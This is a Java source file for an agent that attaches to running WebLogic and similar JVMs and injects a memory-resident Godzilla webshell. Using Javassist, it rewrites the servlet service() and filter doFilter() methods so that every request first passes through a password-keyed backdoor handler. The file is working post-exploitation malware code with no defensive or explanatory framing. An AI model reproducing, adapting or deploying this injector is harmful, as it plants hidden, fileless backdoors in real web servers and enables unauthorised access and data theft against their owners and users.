package com.security;

import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.net.URLDecoder;
import java.security.ProtectionDomain;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Iterator;
import java.util.List;

import static com.security.GodzillaRun.passwords;

public class Main {
    private final static ArrayList<HookInfo> hookList=new ArrayList<HookInfo>();
    private final static ArrayList<Integer> blackClassHash=new ArrayList();

    static {
        hookList.add(new HookInfo("javax.servlet.Servlet", "service", 1, 2, new String[]{"javax.servlet.ServletRequest","javax.servlet.ServletResponse"}));
        hookList.add(new HookInfo("javax.servlet.Filter", "doFilter", 1, 2,new String[]{"javax.servlet.ServletRequest","javax.servlet.ServletResponse","javax.servlet.FilterChain"}));
        hookList.add(new HookInfo("jakarta.servlet.Filter", "doFilter", 1, 2,new String[]{"jakarta.servlet.ServletRequest","jakarta.servlet.ServletResponse","jakarta.servlet.FilterChain"}));
        hookList.add(new HookInfo("jakarta.servlet.Servlet", "service", 1, 2,new String[]{"jakarta.servlet.ServletRequest","jakarta.servlet.ServletResponse"}));

    }


    private static String getCurrentPID() {
        String name = ManagementFactory.getRuntimeMXBean().getName();

        return name.split("@")[0];
    }



    public static String getJarFileByClass(Class cs) {
        String fileString=null;
        String tmpString;
        if (cs!=null) {
            tmpString=cs.getProtectionDomain().getCodeSource().getLocation().getFile();
            if (tmpString.endsWith(".jar")) {
                try {
                    fileString=URLDecoder.decode(tmpString,"utf-8");
                } catch (UnsupportedEncodingException e) {
                    fileString= URLDecoder.decode(tmpString);
                }
            }
        }
        if (fileString!=null){
            if (fileString.indexOf(":")!=0&&fileString.startsWith("/")){
                fileString=fileString.substring(1);
            }
        }
        return fileString;
    }

    public static void main(String[] args)throws Exception {


        if (args.length==0 || !args[0].contains(",")){
            System.out.println("java -jar agent.jar pass,key");
            return;
        }

        try {
            Class.forName("sun.tools.attach.HotSpotAttachProvider",true,Thread.currentThread().getContextClassLoader());
        } catch (ClassNotFoundException e) {

        }

        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList =VirtualMachine.list();

        int size=vmList.size();

        for (int i = 0; i < size; i++) {
            try {
                VirtualMachineDescriptor v=vmList.get(i);
                System.out.println(v);
                if(v.displayName().indexOf("weblogic")!=-1||v.displayName().indexOf("startup")!=-1){
                    VirtualMachine.attach(v).loadAgent(getJarFileByClass(Main.class),args[0]);
                    System.out.println("inject "+v);
                }
            }catch (Exception e){
                e.printStackTrace();
            }
        }

    }

    public static void premain(String agentArgs, Instrumentation inst){
        System.out.println("premain");
        agent0(agentArgs, inst);
    }
    public static void agentmain(String agentArgs, Instrumentation inst){
        System.out.println("agentmain");
        agent0(agentArgs, inst);
    }

    private static void agent0(String agentArgs, Instrumentation inst){
        System.out.println(agentArgs);
        agent(agentArgs.split(","), inst);
    }
    public static byte[] readInputStream(InputStream inputStream) {
        byte[] temp = new byte[1024 * 5];
        int readOneNum = 0;
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            while ((readOneNum = inputStream.read(temp)) != -1) {
                bos.write(temp, 0, readOneNum);
            }
            inputStream.close();
        }catch (Exception e){
            e.printStackTrace();
        }
        return bos.toByteArray();
    }
    public static void agent(String[] agentArgs, Instrumentation inst){

        passwords.put(agentArgs[0],functions.md5(agentArgs[1]).substring(0, 16));

        ClassPool classPool=new ClassPool(true);

        Class[] loadClass=inst.getAllLoadedClasses();

        for (int i = 0; i < loadClass.length; i++) {
            Class cls=loadClass[i];
            Iterator<HookInfo> iterator = hookList.iterator();
            while (iterator.hasNext()){
                HookInfo next = iterator.next();
                try {
                    if (isSupportClass(cls, next)){
                        System.out.println(String.format("className:%s", cls.getName()));
                        if (!blackClassHash.contains(new Integer(cls.hashCode()))){
                            classPool.insertClassPath(new ClassClassPath(cls));
                            CtClass ctClass=classPool.get(cls.getName());
                            try {
                                CtMethod method=getMethodByHookInfo(ctClass,next);
                                if (method!=null){
                                    method.insertBefore(String.format("try{Object o=Class.forName(\"%s\").newInstance();if (o.equals(new Object[]{$%s,$%s})){ return; }}catch (Exception e){e.printStackTrace();}", GodzillaRun.class.getName(),next.getRequestParameterId(),next.getResponseParameterId()));
                                    inst.redefineClasses(new ClassDefinition(cls, ctClass.toBytecode()));
                                    Debug.log(String.format("hook method -> %s ok", method.getName()));
                                }else {
                                    Debug.log(String.format("className:%s not method:%S", cls.getName(),next.getMethodName()));
                                }
                            }catch (Exception e){
                                Debug.logException(e);
                            }catch (Error e){
                                Debug.logException(e);
                            }
                            ctClass.detach();
                            blackClassHash.add(new Integer(cls.hashCode()));
                            continue;
                        }
                    }
                }catch (Exception e){
                    Debug.logException(e);
                }catch (Error e){
                    Debug.logException(e);
                }
            }
        }

    }

    private static CtMethod getMethodByHookInfo(CtClass ctClass,HookInfo hookInfo){
        try {
            CtMethod[] ctMethods=ctClass.getDeclaredMethods();
            for (int i = 0; i <ctMethods.length; i++) {
                CtMethod ctMethod=ctMethods[i];
                if (hookInfo.getMethodName().equals(ctMethod.getName())){
                    String[] parameters=hookInfo.getMethodParameters();
                    CtClass[] ctClasses=ctMethod.getParameterTypes();
                    if (parameters.length==ctClasses.length){
                        for (int j = 0; j < ctClasses.length; j++) {
                            CtClass parameterCtClass=ctClasses[j];
                            String parameterName=parameters[j];
                            if (!parameterName.equals(parameterCtClass.getName())){
                                break;
                            }
                        }
                        return ctMethod;
                    }
                }
            }
        }catch (Exception e){
            Debug.logException(e);
        }
        return null;
    }

    private static boolean isSupportClass(Class cls,HookInfo hookInfo) {
        try {
            Class cs=null;
            if ((cs=Class.forName(hookInfo.getClassName(),true,cls.getClassLoader())).isAssignableFrom(cls)){
                if (!cls.isInterface()){
                    return true;
                }
            }
        }catch (Exception e){

        }
        return false;
    }


}
